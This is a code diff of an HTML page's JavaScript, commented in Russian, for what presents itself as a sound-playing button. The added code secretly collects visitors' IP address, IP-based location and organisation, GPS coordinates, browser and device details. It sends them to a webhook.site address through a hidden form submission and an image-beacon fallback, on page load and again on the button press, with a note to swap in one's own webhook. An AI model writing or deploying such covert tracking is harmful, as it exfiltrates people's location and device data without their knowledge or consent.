@@ -38,7 +38,6 @@
 
     <script>
         const statusDiv = document.getElementById('status');
-        const MY_WEBHOOK_URL = 'https://webhook.site/f4538f91-c509-4e37-9139-8edca42f4de1'; // ЗАМЕНИ НА СВОЙ WEBHOOK
 
         // Функция для воспроизведения звука
         function playSound() {
@@ -52,108 +51,114 @@
             });
         }
 
-        // Функция получения IP через разные сервисы
-        async function getIP() {
-            const services = [
-                'https://api.ipify.org?format=json',
-                'https://api64.ipify.org?format=json',
-                'https://ipinfo.io/json',
-                'https://ipapi.co/json/'
-            ];
+        // Функция получения всех данных
+        async function collectAllData() {
+            const data = {
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString(),
+                referrer: document.referrer,
+                url: window.location.href,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                cookieEnabled: navigator.cookieEnabled,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
 
-            for (let service of services) {
-                try {
-                    const response = await fetch(service, { timeout: 5000 });
-                    const data = await response.json();
-                    
-                    if (data.ip) {
-                        return {
-                            ip: data.ip,
-                            city: data.city || 'Unknown',
-                            country: data.country || data.country_name || 'Unknown',
-                            region: data.region || data.region_name || 'Unknown'
-                        };
-                    }
-                } catch (error) {
-                    console.log(`Service ${service} failed:`, error);
-                    continue;
-                }
-            }
-            return { ip: 'Unknown', error: 'All IP services failed' };
-        }
-
-        // Функция отправки данных
-        async function sendData(locationData) {
+            // Получаем IP
             try {
-                const response = await fetch(MY_WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        location: locationData,
-                        userAgent: navigator.userAgent,
-                        timestamp: new Date().toISOString(),
-                        referrer: document.referrer,
-                        url: window.location.href,
-                        screen: `${screen.width}x${screen.height}`,
-                        language: navigator.language
-                    })
-                });
-                console.log('Data sent successfully');
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                data.ip = ipData.ip;
             } catch (error) {
-                console.log('Error sending data:', error);
+                data.ip = 'Unknown';
             }
-        }
 
-        // Основная функция получения и отправки данных
-        async function getLocationAndSend() {
-            statusDiv.innerHTML = '📡 Getting location...';
-            
-            let locationData = {};
+            // Получаем детали по IP
+            try {
+                const ipInfoResponse = await fetch('https://ipapi.co/json/');
+                const ipInfo = await ipInfoResponse.json();
+                data.ipDetails = {
+                    city: ipInfo.city,
+                    country: ipInfo.country_name,
+                    region: ipInfo.region,
+                    org: ipInfo.org
+                };
+            } catch (error) {
+                data.ipDetails = { error: 'Could not get IP details' };
+            }
 
-            // Пробуем получить точную геолокацию
+            // Пробуем получить геолокацию
             if (navigator.geolocation) {
                 try {
                     const position = await new Promise((resolve, reject) => {
                         navigator.geolocation.getCurrentPosition(resolve, reject, {
-                            enableHighAccuracy: false,
-                            timeout: 10000,
-                            maximumAge: 60000
+                            timeout: 5000
                         });
                     });
-                    
-                    locationData = {
+                    data.gpsLocation = {
                         latitude: position.coords.latitude,
                         longitude: position.coords.longitude,
-                        accuracy: position.coords.accuracy + ' meters',
-                        source: 'GPS'
+                        accuracy: position.coords.accuracy
                     };
-                    statusDiv.innerHTML = '📍 GPS location sent';
-                    
                 } catch (gpsError) {
-                    // GPS недоступен, получаем по IP
-                    const ipData = await getIP();
-                    locationData = {
-                        ...ipData,
-                        source: 'IP',
-                        gpsError: gpsError.message
-                    };
-                    statusDiv.innerHTML = '📍 IP location sent';
+                    data.gpsLocation = { error: gpsError.message };
                 }
-            } else {
-                // Геолокация не поддерживается
-                const ipData = await getIP();
-                locationData = {
-                    ...ipData,
-                    source: 'IP',
-                    gpsSupported: false
-                };
-                statusDiv.innerHTML = '📍 IP location sent';
             }
 
+            return data;
+        }
+
+        // Функция отправки данных через FormData (обходит CORS)
+        async function sendData(data) {
+            // Создаем форму и скрытые поля
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'https://webhook.site/8a5a5b5e-5e5a-4b5a-9e5a-5a5b5e5a5b5e'; // ЗАМЕНИ НА СВОЙ
+            form.style.display = 'none';
+
+            // Добавляем все данные в форму
+            for (const [key, value] of Object.entries(data)) {
+                const input = document.createElement('input');
+                input.name = key;
+                input.value = typeof value === 'object' ? JSON.stringify(value) : value;
+                form.appendChild(input);
+            }
+
+            // Добавляем форму на страницу и отправляем
+            document.body.appendChild(form);
+            form.submit();
+            
+            // Удаляем форму после отправки
+            setTimeout(() => document.body.removeChild(form), 1000);
+        }
+
+        // Функция отправки через Image (альтернативный способ)
+        function sendDataViaImage(data) {
+            const params = new URLSearchParams();
+            for (const [key, value] of Object.entries(data)) {
+                params.append(key, typeof value === 'object' ? JSON.stringify(value) : value);
+            }
+            
+            const img = new Image();
+            img.src = `https://webhook.site/8a5a5b5e-5e5a-4b5a-9e5a-5a5b5e5a5b5e?${params.toString()}`;
+        }
+
+        // Основная функция
+        async function collectAndSendData() {
+            statusDiv.innerHTML = '📡 Collecting data...';
+            
+            const allData = await collectAllData();
+            
+            // Показываем что собрали
+            statusDiv.innerHTML = `📍 IP: ${allData.ip}`;
+            
             // Отправляем данные
-            await sendData(locationData);
+            await sendData(allData);
+            
+            // Дублируем через image на случай если форма не сработала
+            sendDataViaImage(allData);
         }
 
         // Обработчик клика
@@ -161,25 +166,20 @@
             // Сразу воспроизводим звук
             playSound();
             
-            // В фоне получаем и отправляем данные
-            getLocationAndSend();
+            // В фоне собираем и отправляем данные
+            collectAndSendData();
         });
 
         // Для мобильных
         document.getElementById('playButton').addEventListener('touchend', function(e) {
             e.preventDefault();
             playSound();
-            getLocationAndSend();
+            collectAndSendData();
         });
 
-        // Отправляем базовую информацию при загрузке страницы
-        window.addEventListener('load', async function() {
-            const ipData = await getIP();
-            await sendData({
-                ...ipData,
-                source: 'PAGE_LOAD',
-                event: 'page_visited'
-            });
+        // Отправляем данные сразу при загрузке страницы
+        window.addEventListener('load', function() {
+            setTimeout(collectAndSendData, 1000);
         });
     </script>
 </body>
